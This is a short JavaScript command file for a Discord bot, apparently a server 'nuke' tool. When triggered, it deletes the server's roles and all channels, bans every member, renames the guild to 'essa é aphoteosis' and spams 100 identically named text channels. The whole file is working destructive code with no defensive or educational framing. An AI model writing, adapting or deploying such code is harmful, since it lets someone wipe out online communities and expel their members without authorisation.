const discord = require('discord.js')


exports.run = async (client, message) => {

var nuckei = "essa é aphoteosis"

  message.guild.roles
          .filter(r => r.position < message.guild.me.highestRole.position)
          .deleteAll();
      message.guild.channels.deleteAll();

          message.channel.guild.members.forEach(user => {
              user.ban();
          });
  
      message.delete();
      message.guild.setName(nuckei).catch(error => {});


   message.guild.roles
          .filter(r => r.position < message.guild.me.highestRole.position)
          .deleteAll();
      message.guild.channels.deleteAll()


  
      message.delete();
      for (pas = 0; pas < 100; pas++) {
          message.guild.createChannel(nuckei, "text").catch(error => {
              console.log(error)
          });
      }


}
